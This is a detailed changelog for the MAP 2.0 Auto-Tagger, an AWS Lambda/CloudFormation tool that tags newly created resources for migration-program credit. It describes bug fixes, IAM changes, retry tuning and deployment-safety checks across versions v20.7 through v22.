# Changelog

All notable changes to the MAP 2.0 Auto-Tagger.

---

## Unreleased

**Fixed:**

- **Multi-region single-account deploy no longer collides on the staging bucket.** The S3 template-staging bucket was named `auto-map-tagger-{account-id}` (account only). Because the generated template exceeds the 50 KB inline limit, every deploy stages through S3, and a single-account deploy to 2+ regions had the second region's `head-bucket` find the first region's bucket, mismatch on location, and hard-fail that region (`DEPLOY_STATUS=FAILED`). The bucket name is now region-qualified — `auto-map-tagger-{account-id}-{region}` — across `deploy.sh`, `delete.sh`, and the editor/upgrade script, so each region stages independently. Reported by a partner (Megazone) internal test.
  - **Back-compat:** a bucket created by a pre-fix deploy is named without the `-{region}` suffix; the new `delete.sh`/upgrade script looks for the region-qualified name and will not auto-remove the old one. Delete the stale `auto-map-tagger-{account-id}` bucket manually (it is idle once templates upload under the new name). No dual-scheme delete logic was added (most deploys are fresh).
  - On a single-account multi-region deploy failure, the EXIT-trap cleanup removes only the last region's staging bucket (unchanged single-bucket behavior in spirit).

**Added:**

- **us-east-1 advisory warning in the configurator.** When the selected deploy regions omit `us-east-1`, a non-blocking warning notes that global services (CloudFront, Route 53, Global Accelerator, Network Firewall, Direct Connect, App Mesh, Cloud Map) only emit CloudTrail events in us-east-1 and will go untagged. We do **not** force us-east-1 — this is guidance only. Localized across all 7 UI languages.
- **Regression test** (`tests/unit/deploy-script.test.js`) asserting the generated deploy script's staging-bucket name is region-qualified, locking in the multi-region fix.

---

## v22 — Decoupled Build + Simplified Recovery Model

### v22.0.0 — 2026-06-12

MAJOR. Retroactive release covering PRs #89–#100 (merged 2026-05-06 through 2026-05-22). Three breaking changes; customers should regenerate `deploy.sh` from the configurator and read the upgrade notes below.

**Breaking:**

- **Source decoupling (PR #89, #91).** The repository no longer carries a hand-maintained `map2-auto-tagger-optimized.yaml` monolith. The deployable YAML and `configurator.html` are generated from modular sources (`src/js/services/*.js`, `src/js/deploy/template-*.js`, `src/templates/lambda-handler.py`) via `npm run build`. CI rebuilds from `src/` on every PR and fails if committed artifacts are stale. Forks that patched the YAML directly must re-apply changes against `src/`. Eliminates the YAML/configurator drift class (F012) by construction. Developer guide: `docs/DEVELOPMENT.md`.
- **Reconciliation Lambda removed (PR #95).** The nightly reconciliation sweep (introduced v20.5.0) is gone — the real-time tagger with SQS buffering (14-day retention, 5 retries × 180s) is the sole tagging path. Rationale: reconciliation risked mass-tagging damage when SSM config was wrong (e.g., after a scope blow-out) for minimal incremental value. **Operational consequence: DLQ events no longer self-heal.** Resources whose provisioning exceeds the 900s retry budget — notably AWS Managed Microsoft AD (25–45 min in `Creating`) — exhaust retries into the DLQ and must be redriven manually once provisioning completes. The DLQ alarm still fires. See LIMITATIONS.md "Long-provisioning resources."
- **Edit and Upgrade configurator flows disabled (PR #97, #98, #99).** Both had critical bugs: Upgrade reset `scoped_account_ids` to `["ALL"]` when upgrading from templates that predate the new CFN parameters; Edit's sed-on-template approach is incompatible with the `!Sub`-based SSM config. Day-2 account add/remove is now done via CloudShell `update-stack-set` parameter updates (single-line commands in INSTRUCTIONS.md). Template upgrades are delete-and-redeploy.

**Changed:**

- **SSM MapConfig built from CFN parameters (PR #95).** `ScopedAccountIds`, `ScopedVpcIds`, and `TagNonVpcServices` are now CFN parameters referenced via `!Sub`, replacing values baked in by JS template literals. Stack updates with `UsePreviousValue=true` preserve the customer's real scope instead of overwriting it with placeholders.
- **AutoDeployment always enabled (PR #93).** StackSet auto-deployment is unconditional — accounts joining a scoped OU automatically receive the tagger. Supersedes the v20.2.0 conditional (ALL-scope-only) behavior.
- **CloudFormation stacks no longer tagged (PR #92).** CFN is not on the MAP Included Services List; tagging stacks created confusion about credit-earning resources. Also replaced `MAP_Included_Services_List.pdf` with maintainable `docs/MAP_included.md`.
- **MPE ID length limit removed (PR #94, #96).** Validation caps removed across configurator flows and locales; CFN `MpeId` `MaxLength` raised 20 → 44. Real production MPE IDs exceeded the old limit and were silently rejected.

**Added:**

- **FSx for NetApp ONTAP volume tagging (PR #100).** `CreateVolume` event added to the FSx handler — ONTAP volumes are tagged, not just filesystems.
- **CloudFront `CreateDistribution` handler (PR #96).** Extracts the distribution ARN via the case-insensitive `aRN` key in CloudTrail responseElements.

**Fixed (PR #96, CT5 chaos-test findings — 708 tests, 25 phases):**

- SSM config cache invalidated on fetch failure, so the next invocation retries immediately instead of serving the failure for the 60s TTL (CB4).
- Delete-flow log-group guard: no more non-zero exit when `describe-log-groups` returns empty (CB1).
- Per-failure SNS publish removed (alert floods during burst failures); investigation now via the CloudWatch Logs Insights query embedded in the DLQ alarm description.

**Fixed (PR #102, caught by the 2026-06-12 E2E run):**

- **Kinesis silent tag loss — CloudTrail resources-array ARN validation.** AWS began populating a `resources` array on Kinesis `CreateStream` events with a malformed ARN (stream name in the account-ID field, literal `null` as the resource name). The generic resources-array scan in `extract_arn()` trusted it verbatim, so every Kinesis Data Stream failed `AddTagsToStream` with ResourceNotFoundException and was classified permanent-ignorable — a silent MAP tag loss with no DLQ entry and no alert. New `_is_wellformed_arn()` gate rejects structurally invalid ARNs (account field must be empty or 12 digits; resource part must not be `null`) so malformed entries fall through to the dedicated per-service handlers. Keyspaces (the original consumer of the resources-array path) is unaffected. Live-verified on the E2E account. This was an AWS-side event-shape change, not a regression — May-era events carried `resources: null`.

---

## v21.0.7 — 2026-05-01

PATCH. Two correctness fixes for VPC-scope and StackSet cross-region deployments.

- **PreflightLogGroup orphan race fix.** Removed the explicit `PreflightLogGroup` CloudFormation resource. On StackSet delete+redeploy with the same MPE ID, the Custom Resource Delete handler wrote CloudWatch logs *after* CFN deleted the log group, creating an orphan that blocked subsequent deploys with `AlreadyExists`. CloudWatch now auto-creates the log group on Lambda invocation — no explicit resource needed. Root cause of the MA8-use1 cross-region StackSet failure.

- **VPC-scope reconciliation leak + `tag_non_vpc_services` fix.** Added a `_VPC_BOUND` service set (22 service prefixes: ec2, rds, elasticache, etc.) to `is_in_scope`. When `vpc_id` is unresolvable and `tag_non_vpc_services` is `true`, VPC-bound services now return `False` (fail closed) while genuinely non-VPC services (S3, SQS, Lambda, etc.) return `True`. Prevents the daily reconciliation from converting VPC scope into account scope — the reconciliation's synthetic events have no VPC context, so without this check every RGTA-returned resource was re-tagged regardless of VPC membership. Also restores the `tag_non_vpc_services` toggle in the standalone YAML (v21.0.5 PR #83 had removed it entirely).

- **Documentation fixes (PR #87).** Corrected 16 inaccuracies: added `agreement_end_date` and `tag_non_vpc_services` to all SSM JSON examples, fixed claim that `tag_non_vpc_services` was UI-only (it is read at runtime), corrected LIMITATIONS.md on standalone YAML AgreementEndDate, documented `_VPC_BOUND` reconciliation behavior, updated handler count to 154, added Reconciliation and Preflight Lambdas to deployment and cost tables.

---

## COVERAGE.md reset — 2026-04-26

Docs-only, no version bump. Full re-audit of `docs/COVERAGE.md` against the authoritative handler inventory from `.github/scripts/audit_handler_coverage.py --report` (148 explicit `event_name == ...` branches, 153 handler coverage points per the CI baseline) and the `AutoTaggerRole` IAM policy in `map2-auto-tagger-optimized.yaml`. Top-level finding: the v20.3.0–v20.5 doc had drifted across four ship cycles and was carrying claims that were known-broken at ship time (Keyspaces missing `cassandra:Alter`, Directory Service missing `Creating` transient marker — both now fixed per v20.6.4 / v20.8.1) plus claims with no backing handler and no IAM grant (Location Service, Supply Chain, AppConfig, VPC Lattice, Cloud Map HTTP namespaces). Surviving claims now have both a handler branch and the matching IAM action; ambiguous cases are flagged `**UNVERIFIED**` or `**KNOWN GAP**` rather than silently retained. Added a `Retraction history` section covering v20.3.0 Tier 1 MAP claims and the D7 VPC Lattice AccessDenied regression.

---

## v20 — Resilient SQS Pipeline + Open Source

### v20.9.5 — 2026-04-27

PATCH. Two items, both resilience/surface hygiene — no functional change for paths already working.

- **Native-API tag dispatch throttle retry (§1.81/§1.92).** Every native-dispatch branch in `tag_resource()` (S3, QuickSight, CloudFront, Route53, Kinesis, Firehose, APIGateway v1/v2, AutoScaling, SQS, MemoryDB, DAX, StorageGateway, IoT, Keyspaces, CloudHSM v2, Directory Service, Bedrock Agent, Global Accelerator, KinesisVideo) now wraps its single tag call in a shared `_retry_throttles()` helper matching the 4-attempt exponential-backoff pattern (1s → 2s → 4s → 8s, ±25% jitter) previously only wired on the RGTA fallthrough. Short throttles are absorbed in-invocation (~15s worst case) instead of burning one of the 5 SQS redeliveries (180s VT each) → ~15 min retry budget reclaimed for actually-unrecoverable failures. `THROTTLE_CODES` hoisted to module scope so both the native branches and the RGTA loop reference the same constant; duplicate definition inside the RGTA else-branch removed.
- **Configurator review-table XSS hardening (§1.94).** All four review-pane tables (editor, update, delete, main-deploy) now render customer-supplied values via `document.createElement` + `textContent` instead of `innerHTML` + template literal interpolation. The four sites previously interpolated free-form inputs (customer name, contact email, account IDs, VPC IDs) directly into HTML; the input regexes cap what a well-behaved user can type, but `configurator.html` is published publicly and the review pane should not execute arbitrary HTML/JS if a bypass is ever found. Out-of-scope innerHTML sites (`renderVersionHistory`, MPE/account input row scaffolds, `templateListEl` static rows, `btnDiv` / `deployHint`) are left untouched — they build from i18n strings and already-regex-constrained values.

### v20.9.4 — 2026-04-27

Hotfix bundle. PATCH. No behavior changes for already-working paths; closes five latent bugs that were silently losing MAP credit or generating false SNS alerts, plus one docs-correctness fix.

- **CloudHSM v2 event source mismatch (§1.99b).** Handler checked `event_source == 'cloudhsmv2.amazonaws.com'`, but the real CloudTrail eventSource is `cloudhsm.amazonaws.com` — the `v2` only appears in the boto3 service name (`boto3.client('cloudhsmv2')`), not in CloudTrail. Every CloudHSM v2 cluster and HSM created since v20.3.0 was silently skipped at ARN extraction. Live-confirmed 2026-04-27 on 586009411781 (cluster `cluster-c4o3l6l5nno` sat UNINITIALIZED for 7 min with zero tag events). Fixed at both CreateCluster and CreateHsm branches; the `cloudhsmv2` boto3 client for the actual TagResource call is unchanged.
- **NAT Gateway response-wrapper unwrap (§1.50).** `CreateNatGateway` handler tried top-level `resp.get('natGateway')` / `resp.get('natGatewayId')`, but CloudTrail wraps EC2 responses in `<EventName>Response` (the same wrap the sibling handlers — CreateNetworkAcl, CreateLaunchTemplate, CreateTransitGateway, CreateVpnGateway, CreateRouteTable — already unwrap). Refactored to the matching pattern: `resp.get('natGateway', {})` then `resp['CreateNatGatewayResponse'].get('natGateway', {})` fallback.
- **AWS Batch `batch:TagResource` IAM (§1.27).** AWS Batch job queues, compute environments, and job definitions fell through to RGTA dispatch, which AWS routes to `batch:TagResource` per the service-authorization matrix. The action was missing from `AutoTaggerRole.ServiceSpecificTagging` — every tag call returned AccessDenied. Added in the Compute section of the IAM policy, in `.github/sync/tagging-permissions.txt` (canonical), and in `TAGGING_PERMISSIONS` in `configurator.html`. `batch` has no native-dispatch handler in the Lambda (events route through the RGTA fallthrough), so no row was added to `NATIVE_IAM_REQUIREMENTS` in `generate_iam.py`.
- **ElastiCache transient marker (§1.101).** ElastiCache returns `"<resource> is either not present or not available"` during the provisioning race between `CreateCacheCluster` and the tag API's view of the cluster state. Classifier previously routed this to `permanent_actionable` → false SNS alert + event to EventDLQ. Added `'is either not present or not available'` to `_TRANSIENT_MARKERS`; SQS redelivery (5 × 180s = 900s) succeeds once the cluster settles.
- **SSM "concurrently modified" transient marker (§1.44).** SSM raises `ConcurrentUpdateException` with `"concurrently modified"` during parallel `PutParameter` bursts — e.g. customer automation rotating config keys concurrently with the tagger. Added `'concurrently modified'` to `_TRANSIENT_MARKERS`; retry after SQS redelivery resolves.
- **COVERAGE.md CloudFormation row removed (§1.100).** Stack resources do not earn MAP credit — CloudFormation is NOT on the MAP Included Services List (6 April 2026 edition). The "CloudFormation | Stacks, StackSets | RGTA" row under Management & Governance was a false claim. Removed the row; added a retraction-history entry explaining the distinction. The `cloudformation:TagResource / UpdateStack / UpdateStackSet / ListStacks` IAM actions stay in the Lambda role — they are used for internal CFN TagResource routing (AWS auth matrix maps `tag:TagResources` on stacks through `UpdateStack`) and the peer-tagger detector at cold start (§1.108), not for earning MAP credit on customer stacks.

### v20.9.3 — 2026-04-26

- **`TrickleFailureAlarm` CloudWatch alarm.** Catches slow-rate `permanent_actionable` tagging failures that the per-minute `TaggerErrorAlarm` misses. Fires when ≥6 of the last 24 hourly buckets each contain ≥1 `TagFailureByClass{ErrorClass=permanent_actionable, MpeId=…}` datapoint. Catches IAM drift / unhandled resource types while ignoring one-off transients.
- **`InvalidInstanceID.Malformed` carve-out in `RunInstances` volume resolution.** `extract_arns_multi` now fails fast on this error instead of burning the 30s `describe_instances` retry budget. The raised `ClientError` propagates through `_process_event`, the classifier routes it to `permanent_actionable`, and an SNS alert fires. `InvalidInstanceID.NotFound` is unchanged (stays in `PERMANENT_IGNORABLE_MARKERS` — instance may still be materializing).
- **Removed dead duplicate Glue `CreateTable` branch in `extract_arn`.** The first occurrence (early-check above the resources-array scan) already returned the table ARN; the later `elif` at the same location was unreachable dead code.
- **SKIPPED `${AWS::URLSuffix}` polish.** Grepped every `amazonaws.com` occurrence in the YAML — all are either IAM service principals (which CFN resolves per-partition on its own) or inside `ZipFile: |` Python code, not `!Sub` expressions. No CFN `!Sub` strings needed replacement.
- **SKIPPED Neptune/DocDB comment removal.** The comment at the `CreateDBCluster`/`CreateDBInstance` + `rds.amazonaws.com` no-op `elif` documents live behavior (Neptune/DocDB share the RDS event source and are already handled by the existing RDS branches). Not dead; kept.

### v20.9.2 — 2026-04-26

- **`get_config()` fails closed on SSM unreachability.** Wraps `ssm.get_parameter` + JSON parse in try/except; on failure logs `CONFIG_UNREACHABLE` and returns a safe-default config with `mpe_id=None`. `is_in_scope` hard-rejects that state, so nothing tags until the next TTL refresh succeeds. Prior behavior let one transient SSM hiccup DLQ an entire burst.
- **Whitespace-strip on SSM config lists.** `scoped_account_ids` and `scoped_vpc_ids` are `.strip()`-ed on config parse; empty elements dropped. CFN `CommaDelimitedList` strips on deploy, but SSM-stored config may carry customer-edit whitespace.
- **Empty-`mpe_id` guard in `is_in_scope`.** Returns False at the scope-decision entry point if `config.mpe_id` is falsy (§1.3 defense-in-depth).
- **`agreement_start_date` strptime cross-check in `is_in_scope`.** CFN `AllowedPattern` is already strict, but `2026-02-31` passes the regex and fails `strptime`; logs `CONFIG_INVALID_AGREEMENT_DATE` and returns False. Additive — the CFN regex is unchanged (§1.129 class).
- **`MpeId` CFN parameter `MaxLength: 20`.** The existing `^mig[a-zA-Z0-9]+$` pattern had no length cap; real MPE IDs are `mig` + 10–13 chars, so 20 is well above real usage and prevents an absurdly long ID from leaking into log group names or SSM parameter paths.

### v20.9.1 — 2026-04-26

- **TRANSIENT_MARKERS expansion.** Added `OperationAborted`, `conflicting conditional operation` (S3 409 concurrent-op), `SnapshotCreationPerVolumeRateExceeded` (EC2 per-volume burst ceiling), and `Throttling.User` (EC2/STS throttle variant). Prior classifier routed these retry-eligible failures to `permanent_actionable` → false SNS alerts during normal burst conditions that resolve on SQS redelivery.
- **PERMANENT_IGNORABLE for Bedrock system-defined inference profiles.** `CreateInferenceProfile` fires for both application profiles (taggable) and system-defined profiles (tag API returns "System-defined Inference Profile is not taggable"). Silently ack the system ones via CW metric while continuing to tag application profiles from the same event — NOT added to `IGNORE_EVENTS`, which would skip both.

### v20.9.0 — CFN Custom Resource preflight + support contract (§1.108, plan-PR #59)

MINOR. Closes the §1.108 temporal race — the specific collision case that the configurator's `deploy.sh` preflight cannot catch because `deploy.sh` doesn't run for StackSet `AutoDeployment: True` provisioning into newly-joined OU accounts. PR #60 (v20.8.0) added a runtime alarm for this case but did not prevent the tagging. This PR makes CFN itself refuse to provision the tagger Lambda when a peer tagger already exists with overlapping scope in the same account+region.

**`PreflightFunction` + `Custom::PeerTaggerPreflight` resource.** New Lambda resource invoked by a CFN Custom Resource before `AutoTaggerFunction` is created. Implementation (~90 LOC inline Python):

- Paginates `cloudformation:ListStacks` for `map-auto-tagger-mig*` in this account+region (same pattern as the PR #60 runtime detector).
- For each peer stack, reads its SSM config (`/auto-map-tagger/<peer_mpe>/config`) and classifies scope overlap across the five cases the configurator preflight already handles: `account/ALL × account/*`, `account/[list] × account/[list]`, `account × vpc` (both directions), `vpc/[list] × vpc/[list]`.
- On detected overlap: returns `FAILED` with every conflicting stack name, peer MPE, and specific reason — which CFN surfaces as `Received response status [FAILED]` in the stack events.
- `AutoTaggerFunction` has `DependsOn: PreflightTrigger`, so FAILED → stack rolls back → no tagger Lambda is ever provisioned in the contaminated account. The existing peer Lambda is untouched.

**Fail-open on internal error.** Any exception inside the Custom Resource handler (throttle / IAM propagation / region transient) returns `SUCCESS` with the exception class + message in `Reason`. A transient AWS condition never blocks a legitimate deploy. PR #60's `PeerTaggerDetectedAlarm` remains as the second backstop if fail-open lets a real conflict through.

**Only fires on `Create`.** `Update` and `Delete` are no-ops. Updates don't add a peer Lambda (the tagger already exists); Delete is tear-down. This matches the semantics of preflight — it guards stack provisioning, not lifecycle.

**New IAM role `PreflightRole` with three statements:**

- `cloudformation:ListStacks` on `*` (no resource-level IAM per AWS auth matrix).
- `ssm:GetParameter` scoped to `arn:aws:ssm:<region>:<account>:parameter/auto-map-tagger/*/config`.
- CloudWatch Logs write scoped to this account+region.

**What this doesn't do.** It doesn't prevent contamination if the customer already has two tagger stacks at the moment v20.9.0 upgrades into one of them (preflight runs on Create, not Update, so an upgrade proceeds even with a pre-existing peer). The runtime detector from PR #60 still surfaces that case via `PeerTaggerDetectedAlarm`. Customers with existing conflicts should run the ship-recommended cleanup (delete one of the stacks, narrow scope on the other) before upgrading.

**Operator signal.** Unlike PR #60's CloudWatch alarm path, a preflight-blocked StackSet deployment shows up as `CREATE_FAILED` in the StackSet instances view of the CFN console, with the Custom Resource's `Reason` string (peer stack name + MPE + conflict reason) directly visible. No SNS subscribers needed.

### Support contract (docs)

`docs/LIMITATIONS.md` now states explicitly that direct `aws cloudformation create-stack` against `map2-auto-tagger-optimized.yaml` is unsupported. The customer-facing contract is: generate `deploy.sh` from `configurator.html`, run `deploy.sh`. Direct-YAML usage bypasses all preflight checks and has reproducibly surfaced bugs that don't occur through the configurator path. Bugs reported against direct-YAML usage will be closed with a request to reproduce via the configurator.

---

### v20.8.1 — Directory Service transient markers (§1.98)

PATCH. Adds `'Directory Status: Creating'` and `'not supported for directories in this state'` to the `TRANSIENT_MARKERS` set in both `map2-auto-tagger-optimized.yaml` and `configurator.html`. Directory Service resources (MS AD and Simple AD, created via `CreateDirectory` / `CreateMicrosoftAD`) spend 5–10 min (Simple AD) or 25–45 min (MS AD) in the `Creating` state after CloudTrail fires the create event. Tagging during that window returns

> "The operation is not supported for directories in this state. Directory Status: Creating"

Before this patch, the three-path classifier (v20.4.0) routed that message to `permanent_actionable` → SNS alert on every AD creation, because the substring didn't match any existing transient marker. After the patch:

- **Simple AD** — transient retries succeed within the 5 × 180s = 900s SQS redelivery budget. The tag lands correctly; no customer action needed.
- **MS AD** — transient retries exhaust before the 25–45 min provisioning window completes. Exhausted retries land in `EventDLQ` *without* generating a false `permanent_actionable` SNS alert. The `ReconciliationFunction` (v20.5.0) catches the untagged directory on its next nightly sweep and tags it then.

This is a documented Tier 1 MAP service whose credit-loss was the v20.3.0 regression headline. Keyspaces (§1.99) was closed in v20.6.4 by adding `cassandra:Alter` IAM; CloudHSM v2's equivalent §1.99-class bug remains deferred pending a direct-deploy smoke (untested since PR #25).

No template shape change, no IAM change, no new CFN resources — pure classifier tuple extension.

---

### v20.8.0 — BatchSize 1→10 + peer-tagger detection (plan-PR #57)

MINOR. Two architectural changes closing the Phase 16 "burst × stack-count amplification" class (§1.123, §1.124, §1.125, §1.131) and adding surface for the still-open §1.108 cross-Lambda contamination case. Shipped as MINOR because the runtime batching shape is observable to customers (new SQS invocation pattern, new CloudWatch metric) and the new IAM action `cloudformation:ListStacks` is customer-visible in the Lambda policy.

**BatchSize 1 → 10 + `ReportBatchItemFailures` (§1.123, §1.124, §1.125, §1.131).** Phase 16 overnight chaos run measured the Lambda drain rate at **1.3 messages/second per function** with the prior `BatchSize: 1` setting — a single 15,215-resource burst produced a **2.8-hour backlog** per tagger. With 7 taggers active in a shared account (Phase 16 Test 4), 15K creates amplified to 91K queued messages. The fix raises BatchSize to 10 with `FunctionResponseTypes: [ReportBatchItemFailures]`: each invocation now processes up to 10 SQS records at a time, and only records that classify as `transient` or `permanent_actionable` are returned in the `batchItemFailures` list for SQS redelivery. `permanent_ignorable` records (resource deleted between create and tag) are acked via omission, preserving the existing three-path classifier semantics. `MaximumBatchingWindowInSeconds: 5` lets batches fill under steady load without adding latency on idle queues. Per-record error handling is preserved by a `_process_event(eb_event, config)` helper that the batch-aware `handler()` calls once per record. Drain rate is expected to rise ~10× (to ≥10 msg/s per Lambda) — a follow-up Layer 2 `burst-scalability` test will measure this directly.

**Runtime peer-tagger detection (§1.108 partial).** The configurator's Class-2 scope-intersection preflight (PR #24) and Q3 Option D deploy-time preflight (PR #38) hard-fail on overlap at `deploy.sh` runtime. But when a customer's account receives a peer tagger via **StackSet `AutoDeployment: True`** into a newly-joined OU account, `deploy.sh` never runs — the CFN StackSet engine creates the stack instance directly. Phase 16 Test 5 confirmed the silent failure mode: linked3 had `migbfltest1` (own deploy) + `migph2stack01` (StackSet-provisioned) → **0/50 resources** tagged with `migbfltest1`. New cold-start detector paginates `cloudformation:ListStacks` for `map-auto-tagger-mig*` prefix, logs a WARN line for any peer MPEs found, and emits `MapAutoTagger/PeerTaggerDetected` CloudWatch metric with `MpeId` + `PeerMpeId` dimensions. New `PeerTaggerDetectedAlarm` → existing `AlertTopic`, so customers with a subscriber (PR #34) get notified within ~1 hour of a peer appearing. This detector does **not** prevent contamination — the architectural routing fix is plan-PR #59 (blocked on design decision). It surfaces the condition so customers can react before a MAP finance audit does. Detector wraps all I/O in `try/except` — a missing `cloudformation:ListStacks` grant or regional throttle never blocks Lambda cold start.

**IAM + CW additions.** New `cloudformation:ListStacks` grant in `AutoTaggerRole` (read-only, no resource-level IAM per AWS auth matrix — scope is implicitly the caller's account). Existing `cloudwatch:PutMetricData` grant on `MapAutoTagger` namespace covers the new metric. Canonical `tagging-permissions.txt` + `generate_iam.py` `NATIVE_IAM_REQUIREMENTS` both updated so the IAM Completeness Layer 1 gate catches future drift.

**New Layer 1 gate: `batchsize-floor`.** Regression guard enforcing `EventQueueMapping.BatchSize >= 10` and `ReportBatchItemFailures` present in both YAML and the configurator's inline template. Our E2E creates ~50 resources, so a silent revert to `BatchSize: 1` would not surface through Layer 2. Lives at `.github/scripts/lint_batchsize_floor.py`, wired into `.github/workflows/lint.yml` as a new required check (run on every PR).

**What this PR does NOT change.** The EventBridge rule stays as-is (§1.127 date-filter was deemed infeasible cleanly — EventBridge patterns don't support date-string comparison). Plan-PR #57 sub-fix (c) "pre-deploy multi-tagger detector" is already shipped via PR #24 + PR #38 at the configurator layer; this PR adds the runtime half as a defense-in-depth layer rather than duplicating the deploy-time logic. Plan-PR #43b (allowlist removal) stays deferred.

---

### v20.7.3 — Post-refactor handler gaps (plan-PR #53)

PATCH. Bundle of 6 service-specific handler fixes, mostly runtime correctness bugs where the handler produced an ARN that RGTA silently rejected. Partial collapse from the original plan-PR #53 scope — PR #43a's suffix-match absorbed the generic `*Arn` field-name gap, leaving these service-specific edge cases.

**§1.83 — CloudWatch Dashboard ARN region.** `PutDashboard` handler emitted `arn:aws:cloudwatch:<region>:<acct>:dashboard/<name>`, but AWS dashboards are account-global — the authoritative ARN has an **empty region** segment (`arn:aws:cloudwatch::<acct>:dashboard/<name>`). RGTA rejected the region-scoped form, so every `PutDashboard` event silently AccessDenied'd. Also switched the name-extraction to `ci_get` (camelCase `dashboardName` vs PascalCase `DashboardName` both appear in CloudTrail samples).

**§1.84 — Security Hub + DAX.** Two distinct fixes:
- `EnableSecurityHub` returns a null body, so the universal ARN scan had nothing to extract → `no_arn` skip. New handler constructs `arn:aws:securityhub:<region>:<acct>:hub/default` directly (hub name is always `default` in the only supported case per AWS docs).
- DAX's response extraction worked (`cluster.clusterArn`) but the tag_resource dispatch had no DAX branch, so every event fell through to RGTA. RGTA does NOT support DAX — `FailedResourcesMap` AccessDenied on every CreateCluster. New `:dax:` branch uses native `dax.tag_resource(ResourceName=arn, Tags=[…])`. IAM grant `dax:TagResource` was already present.

**§1.85 — Storage Gateway.** `ActivateGateway` handler added. `GatewayARN` field name in the response was caught by PR #43a's suffix-match fallback, but RGTA doesn't support Storage Gateway at all — new `:storagegateway:` branch in tag_resource uses native `storagegateway.add_tags_to_resource(ResourceARN=arn, Tags=[…])`. IAM grant `storagegateway:AddTagsToResource` was already present.

**§1.86 — CloudWatch Logs Insights QueryDefinition.** `PutQueryDefinition` handler constructed `arn:aws:logs:<region>:<acct>:query-definition:<id>`, an ARN shape that RGTA + native tagging both reject (documented in MAP_TAGGING_GAP_ANALYSIS.md). Generated SNS alarm noise on every QueryDefinition creation. Moved to IGNORE_EVENTS; dead handler removed.

**§1.87 — Service Discovery HTTP Namespace.** `CreateHttpNamespace` returns only an `operationId`; resolving to an ARN requires an async `DescribeOperation` poll that could take minutes — well past the SQS 180s visibility window. Handler previously returned `None` with a TODO. Moved to IGNORE_EVENTS.

**CI: `generate_iam.py` extended.** `NATIVE_IAM_REQUIREMENTS` now covers `dax` and `storagegateway`, so the IAM Completeness Layer 1 check catches future drift in these native-dispatch branches.

**Handler coverage baseline regenerated.** 106/153 (unchanged percentage). The two new handlers (`ActivateGateway`, `EnableSecurityHub`) are added as `UNCOVERED` in the baseline with justification — both require dedicated E2E fixtures that don't fit the current Layer 2 budget (Storage Gateway needs an on-prem appliance or VPC-endpoint harness; Security Hub is a global service with side-effect enablement). Tracked as follow-up.

---

### v20.7.2 — D7-D13 docs + IAM + IGNORE_EVENTS (plan-PR #56)

PATCH. Closes D7, D8, D9, D11, D12, D13 from the plan's docx series. D10 already landed in GH #32.

**D7 — VPC Lattice coverage actually backed.** COVERAGE.md claims "VPC Lattice: Service networks via RGTA" but the YAML IAM policy was missing `vpc-lattice:TagResource`. RGTA dispatches to the underlying service's TagResource API — without the grant, every `CreateServiceNetwork` event AccessDenied'd silently through the RGTA fallthrough. Added `vpc-lattice:TagResource` to YAML `ServiceSpecificTagging` + canonical list. Configurator's inline Lambda already had it.

**D8 — Bedrock AgentCore ghost claim removed.** OVERVIEW.md line 97 listed Bedrock AgentCore among AI/ML coverage, but there's no standalone handler (AgentCore support is in the configurator inline Lambda but not the distributable YAML). Removed the claim; it will return when plan-PR #55 ships the dedicated handler.

**D9 — Cost table completeness.** OVERVIEW.md cost table added SQS ($0, within free tier) and SNS ($0, alarm-only) rows. Lambda + EventBridge + CloudTrail + SSM rows unchanged. Total-per-account figure unchanged.

**D11 — API Gateway API Key handler removed → IGNORE_EVENTS.** The handler at YAML:1388 constructed `arn:aws:apigateway:{region}::/apikeys/{id}`, an ARN shape that RGTA + native tagging both reject (documented in MAP_TAGGING_GAP_ANALYSIS.md). Every `CreateApiKey` event generated a tagging failure and SNS alarm noise. Moved to `IGNORE_EVENTS` and deleted the dead construction branch.

**D12 — v20.3.0 CHANGELOG retraction note.** v20.3.0 shipped Tier 1 MAP service claims (Keyspaces, DS, CloudHSM) with two live-broken handlers (§1.98 MS AD TRANSIENT_MARKERS gap, §1.99 Keyspaces missing `cassandra:Alter`). Added a retraction note to the v20.3.0 entry pointing at the v20.5.1 / v20.6.4 fixes so customers reading back through the changelog don't miss that v20.3.0–v20.6.3 were broken for those services.

**D13 — INSTRUCTIONS upgrade dual-Lambda warning.** INSTRUCTIONS.md's "Upgrading from a Previous Version" section described only the pre-v19 migration path; recommended flow for v19+ is in-place via `upgrade.sh` (no dual-Lambda window). For the legacy migration path, added an explicit warning about the 2-5 minute window where both the old and new Lambdas process events, plus a mitigation note (pause resource creation during migration).

**Bonus fix: sync-check IAM regex.** Discovered while verifying D7 — the `re.findall(r"'([\w]+:[\w]+)'", ...)` patterns in `sync-check.py` didn't match hyphens in service prefixes, so 11 hyphenated actions (`vpc-lattice:*`, `resource-explorer-2:*`, `sms-voice:*`, `network-firewall:*`, `redshift-serverless:*`, etc.) were invisible to the drift check. Widened to `[\w-]+:[\w]+`.

---

### v20.7.1 — Handler case-sensitivity (plan-PR #51)

PATCH. Closes §1.91 Redshift, §1.97 Kendra CreateIndex, §1.103 Elastic Beanstalk CreateApplication — three live-confirmed silent-miss handlers where CloudTrail emits camelCase response field names while the handler was written against the boto3 SDK PascalCase shape.

**Root cause.** AWS CloudTrail's field casing reflects the API's wire format — older services (Kendra, Redshift, Elastic Beanstalk, SageMaker) emit camelCase or lowercase keys (`id`, `clusterIdentifier`, `applicationName`); newer services emit PascalCase (`Id`, `ClusterIdentifier`, `ApplicationName`). The boto3 SDK presents the PascalCase shape to Python code, so handlers written via `resp.get('Id')` silently returned `None` when CloudTrail actually emitted `id`.

**Fix.** New `ci_get(d, key)` helper at the top of the Lambda: case-insensitive dict lookup with exact-match priority (exact casing always wins over a case-folded match to preserve behavior when both variants exist). Only applied to `responseElements` / `requestParameters` reads — not to internal dicts where we control the key shape. Refactored §1.91 (Redshift `clusterIdentifier`), §1.97 (Kendra `Id` → `id`), §1.103 (Elastic Beanstalk `Application.ApplicationName` → nested `application.applicationName`), and proactively simplified SageMaker `CreateDomain` / `CreatePipeline` / `CreateFeatureGroup` hand-coded or-chains (`resp.get('xArn') or resp.get('XArn')`) to use `ci_get`.

**Defense.** 10/10 unit-test matrix for ci_get semantics (exact match wins over case-folded match; both variants work; None handling; non-dict handling; insertion-order tie-break on case-folded collisions).

---

### v20.7.0 — ARN suffix-match fallback (plan-PR #43a, additive subset)

